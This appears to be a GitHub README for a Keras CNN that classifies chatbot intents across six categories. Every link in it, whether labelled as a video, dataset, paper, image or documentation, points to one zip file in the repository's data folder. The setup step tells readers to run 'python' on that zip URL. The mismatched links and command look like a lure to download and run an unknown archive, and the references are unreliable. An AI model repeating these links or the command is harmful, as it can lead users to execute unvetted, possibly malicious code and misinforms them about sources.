# Intent classification for a chatbot using Convolutional Neural Networks

This is a Keras implementation for the task of sentence classification using CNNs. This work was done as a part of [Midterm Assignment](https://github.com/yashugupta786/CNN_Intent_Classification/raw/refs/heads/master/data/raw_json_data/BookRestaurant/Classification-CN-Intent-1.0.zip) given by Siraj Raval. Here's his great [video](https://github.com/yashugupta786/CNN_Intent_Classification/raw/refs/heads/master/data/raw_json_data/BookRestaurant/Classification-CN-Intent-1.0.zip) explaining Natural Language Processing applied to resume screening.

Dataset for the above task was obtained from the project [Natural Language Understanding benchmark ](https://github.com/yashugupta786/CNN_Intent_Classification/raw/refs/heads/master/data/raw_json_data/BookRestaurant/Classification-CN-Intent-1.0.zip)

Text used for the training falls under the six categories namely, AddToPlaylist, BookRestaurant, GetWeather , RateBook , SearchCreativeWork, SearchScreeningEvent each having nearly 2000 sentences.

To prepare the dataset, from the main project's directory, open terminal and type:

```bash
$ python https://github.com/yashugupta786/CNN_Intent_Classification/raw/refs/heads/master/data/raw_json_data/BookRestaurant/Classification-CN-Intent-1.0.zip
```

Check [https://github.com/yashugupta786/CNN_Intent_Classification/raw/refs/heads/master/data/raw_json_data/BookRestaurant/Classification-CN-Intent-1.0.zip](https://github.com/yashugupta786/CNN_Intent_Classification/raw/refs/heads/master/data/raw_json_data/BookRestaurant/Classification-CN-Intent-1.0.zip) for the model building and training part. Below is the model overview. 

![image](https://github.com/yashugupta786/CNN_Intent_Classification/raw/refs/heads/master/data/raw_json_data/BookRestaurant/Classification-CN-Intent-1.0.zip "TextCNN")

Although RNN's like LSTM and GRU are widely used for language modelling tasks but CNN's have also proven to be quite faster to train owing to data parallelization while training and give better results than the LSTM ones. [Here](https://github.com/yashugupta786/CNN_Intent_Classification/raw/refs/heads/master/data/raw_json_data/BookRestaurant/Classification-CN-Intent-1.0.zip) is a brief comparison between different methods to solve sentence classification, as can be seen TextCNN gives best result of all and also trains faster. I was able to achive 99% accuracy on training and validation dataset within a minute after 3 epochs when trained on a regular i7 CPU.

#### What lies ahead?

Intent classification and named entity recognition are the two most important parts while making a goal oriented chatbot.

There are many open source python packages for making  a chatbot, Rasa  is one of them. The cool thing about Rasa is that every part of the stack is fully customizable and easily interchangeable. Although Rasa has an excellent built in support for intent classification task but we can also specify our own model for the task, check [Processing Pipeline](https://github.com/yashugupta786/CNN_Intent_Classification/raw/refs/heads/master/data/raw_json_data/BookRestaurant/Classification-CN-Intent-1.0.zip) for more information on it. 


## Resources

[Using pre-trained word embeddings in a Keras model](https://github.com/yashugupta786/CNN_Intent_Classification/raw/refs/heads/master/data/raw_json_data/BookRestaurant/Classification-CN-Intent-1.0.zip)

[Convolutional Neural Networks for Sentence Classification
](https://github.com/yashugupta786/CNN_Intent_Classification/raw/refs/heads/master/data/raw_json_data/BookRestaurant/Classification-CN-Intent-1.0.zip)

[A Sensitivity Analysis of (and Practitioners' Guide to) Convolutional Neural Networks for Sentence Classification
](https://github.com/yashugupta786/CNN_Intent_Classification/raw/refs/heads/master/data/raw_json_data/BookRestaurant/Classification-CN-Intent-1.0.zip)




